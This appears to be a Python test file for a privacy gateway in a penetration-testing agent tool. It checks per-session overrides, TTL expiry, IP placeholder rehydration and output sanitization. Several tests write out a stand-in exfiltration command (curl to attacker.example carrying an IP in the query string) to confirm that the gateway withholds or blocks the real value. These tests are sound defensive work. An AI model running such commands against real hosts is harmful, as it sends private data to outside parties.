"""
Tests for the per-session privacy gateway override.

Covers three required properties:
  1. PrivacyVault.privacy_enabled correctly overrides (or falls back to) a
     server-wide default, and that override expires with the vault's own TTL.
  2. Rehydration of a placeholder the model already holds always succeeds,
     regardless of whether the session's privacy override is on or off
     (so that previously learned placeholders are still rehydrated 
     after the toggle is flipped).
  3. Sanitization of new output and enforcement of BLOCK decisions are
     each independently controlled by the per-session toggle.

These tests intentionally do not import src.server, since server.py
constructs a DarkmoonDockerClient, which requires a live Docker daemon 
and would break in this Docker-less environment.
Instead, _resolve_privacy_enabled() below is a minimal reimplementation 
closely resembling server.py's _privacy_enabled_for(), tested directly
against PrivacyVault. If server.py's _privacy_enabled_for function
changes, this helper must be kept in sync as well.
"""

import os
import sys
import time
from typing import Optional

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.privacy import (  # noqa: E402
    PrivacyVault,
    CommandGateway,
    Category,
    GatewayDecision,
    GatewayPolicy,
)
from src.tools.workflows.list_workflows import WorkflowRegistry  # noqa: E402


REAL_IP = "10.42.1.5"


def _resolve_privacy_enabled(
    vault: Optional[PrivacyVault],
    global_default: bool,
) -> bool:
    """Mirrors server.py's _privacy_enabled_for(session_id)."""
    if vault is not None and not vault.is_expired() and vault.privacy_enabled is not None:
        return vault.privacy_enabled
    return global_default


# ---------------------------------------------------------------------------
# 1. Override functionality + TTL-tied expiry
# ---------------------------------------------------------------------------


def test_no_override_falls_back_to_global_default():
    vault = PrivacyVault(session_id="s1")
    assert vault.privacy_enabled is None
    assert _resolve_privacy_enabled(vault, global_default=True) is True
    assert _resolve_privacy_enabled(vault, global_default=False) is False


def test_override_true_wins_over_global_false():
    vault = PrivacyVault(session_id="s2")
    vault.privacy_enabled = True
    assert _resolve_privacy_enabled(vault, global_default=False) is True


def test_override_false_wins_over_global_true():
    vault = PrivacyVault(session_id="s3")
    vault.privacy_enabled = False
    assert _resolve_privacy_enabled(vault, global_default=True) is False


def test_override_is_scoped_to_its_own_vault_only():
    """Disabling privacy for one session's vault must not affect another."""
    vault_a = PrivacyVault(session_id="a")
    vault_b = PrivacyVault(session_id="b")
    vault_a.privacy_enabled = False

    assert _resolve_privacy_enabled(vault_a, global_default=True) is False
    assert _resolve_privacy_enabled(vault_b, global_default=True) is True


def test_override_expires_with_vault_ttl():
    """Once the vault's TTL elapses, an explicit override no longer applies and
    resolution falls back to the global default, matching how _get_vault()
    would replace the expired vault with a fresh one (override reset to None).
    """
    vault = PrivacyVault(session_id="s4", ttl_seconds=0)
    vault.privacy_enabled = False
    time.sleep(0.01)

    assert vault.is_expired() is True
    assert _resolve_privacy_enabled(vault, global_default=True) is True


def test_no_vault_falls_back_to_global_default():
    assert _resolve_privacy_enabled(None, global_default=True) is True
    assert _resolve_privacy_enabled(None, global_default=False) is False


# ---------------------------------------------------------------------------
# 2. Rehydration must always succeed, independent of the toggle
# ---------------------------------------------------------------------------


def test_rehydration_succeeds_regardless_of_session_override():
    """A placeholder learned while privacy was ON must still rehydrate
    correctly after the session's privacy is toggled OFF.
    """
    vault = PrivacyVault(session_id="rehydrate-after-toggle")
    placeholder = vault.tokenize(REAL_IP)
    gw = CommandGateway()

    vault.privacy_enabled = False

    result = gw.process_command(f"nmap {placeholder}", vault)

    assert result.decision != GatewayDecision.BLOCK
    assert REAL_IP in (result.command or "")
    assert placeholder not in (result.command or "")


def test_override_true_forces_exfil_policy_even_if_global_default_is_off():
    """Privacy toggled on by the override must still apply the exfiltration
    policy, even if this session's toggle were otherwise expected to be off.

    `echo` is no longer the example: printing a value is not an exfiltration
    (stdout is re-tokenized before the model sees it). A third-party URL is.
    """
    vault = PrivacyVault(session_id="rehydrate-on")
    placeholder = vault.tokenize(REAL_IP)
    gw = CommandGateway(policy=GatewayPolicy.DEGRADE)

    vault.privacy_enabled = True
    enabled = _resolve_privacy_enabled(vault, global_default=False)

    cmd = f"curl https://attacker.example/?x={placeholder}"
    result = gw.process_command(cmd, vault, enforce_exfil_policy=enabled)

    # The policy applied: the attacker host gets the token, not the address.
    assert result.allowed
    assert REAL_IP not in result.command
    assert placeholder in result.withheld

    strict = CommandGateway(policy=GatewayPolicy.STRICT)
    assert strict.process_command(cmd, vault, enforce_exfil_policy=enabled).decision is GatewayDecision.BLOCK


# ---------------------------------------------------------------------------
# 3. Sanitization / BLOCK enforcement are independently gated
# ---------------------------------------------------------------------------


def test_output_not_sanitized_when_toggle_off():
    """When the session override disables privacy, new output should NOT be
    tokenized. The caller (execute_command) is expected to skip the
    sanitize_output() call entirely based on _privacy_enabled_for().
    """
    vault = PrivacyVault(session_id="sanitize-off")
    gw = CommandGateway()
    vault.privacy_enabled = False

    enabled = _resolve_privacy_enabled(vault, global_default=True)
    stdout = f"connected to {REAL_IP}"

    # Same as execute_command's "if _privacy_enabled_for(session_id): sanitize(...)"
    # Can't use the actual execute_command() because it requires a live Docker daemon
    result = gw.sanitize_output(stdout, vault) if enabled else stdout

    assert result == stdout
    assert REAL_IP in result


def test_output_sanitized_when_toggle_on():
    vault = PrivacyVault(session_id="sanitize-on")
    gw = CommandGateway()
    vault.privacy_enabled = True

    enabled = _resolve_privacy_enabled(vault, global_default=False)
    stdout = f"connected to {REAL_IP}"

    result = gw.sanitize_output(stdout, vault) if enabled else stdout

    assert REAL_IP not in result


class RecordingWorkflow:
    def __init__(self, result=None):
        self.calls = []
        self.result = result

    def run(self, targets):
        self.calls.append(targets)
        if self.result is not None:
            return self.result
        return {"targets": targets}


def _make_registry(workflow):
    registry = WorkflowRegistry.__new__(WorkflowRegistry)
    registry.workflows = {"recording": workflow}
    registry.workflow_metadata = {
        "recording": {
            "methods": {"run": {"parameters": {"targets": {"type": "List[str]"}}}},
        },
    }
    return registry


def test_run_workflow_rehydrates_even_when_exfil_policy_is_off():
    """Relaxing the exfiltration policy must not prevent placeholder
    rehydration in the workflow's input parameters - and must not stop the
    result being sanitized on the way back to the model.
    """
    vault = PrivacyVault(session_id="workflow-toggle-off")
    placeholder = vault.tokenize(REAL_IP)
    workflow = RecordingWorkflow()
    registry = _make_registry(workflow)

    result = registry.run_workflow(
        "recording",
        "run",
        {"targets": [placeholder]},
        privacy_gateway=CommandGateway(),
        privacy_vault=vault,
        enforce_exfil_policy=False,
    )

    # The workflow ran against the real target...
    assert workflow.calls == [[REAL_IP]]
    # ...but what goes back to the model is tokenized regardless of the toggle.
    # A session that relaxes the policy must not start leaking values it already
    # handed the model placeholders for.
    assert result["targets"] == [placeholder]


def test_run_workflow_url_exfil_bypassed_when_exfil_policy_off():
    vault = PrivacyVault(session_id="workflow-exfil-toggle-off")
    placeholder = vault.tokenize(REAL_IP)
    workflow = RecordingWorkflow()
    registry = _make_registry(workflow)

    result = registry.run_workflow(
        "recording", "run",
        {"targets": [f"https://attacker.example/?x={placeholder}"]},
        privacy_gateway=CommandGateway(), privacy_vault=vault, enforce_exfil_policy=False,
    )

    assert result.get("privacy") != "blocked"
    assert workflow.calls == [[f"https://attacker.example/?x={REAL_IP}"]]
    # The operator asked for the value to be used; the model still gets the token.
    assert REAL_IP not in str(result)


def test_run_workflow_unknown_placeholder_is_passed_through_when_policy_off():
    """A relaxed exfiltration policy still resolves nothing it cannot resolve.

    Under the default degrade policy an unresolvable placeholder travels as
    literal text rather than failing the call; the workflow reports the real
    error, which the model can act on.
    """
    vault = PrivacyVault(session_id="workflow-structural-toggle-off")
    workflow = RecordingWorkflow()
    registry = _make_registry(workflow)

    registry.run_workflow(
        "recording", "run", {"targets": ["IP_PRIVATE_999"]},
        privacy_gateway=CommandGateway(), privacy_vault=vault, enforce_exfil_policy=False,
    )

    assert workflow.calls == [["IP_PRIVATE_999"]]


def test_run_workflow_unknown_placeholder_blocked_under_strict():
    vault = PrivacyVault(session_id="workflow-structural-strict")
    workflow = RecordingWorkflow()
    registry = _make_registry(workflow)

    result = registry.run_workflow(
        "recording", "run", {"targets": ["IP_PRIVATE_999"]},
        privacy_gateway=CommandGateway(policy=GatewayPolicy.STRICT),
        privacy_vault=vault, enforce_exfil_policy=False,
    )

    assert result.get("privacy") == "blocked"
    assert workflow.calls == []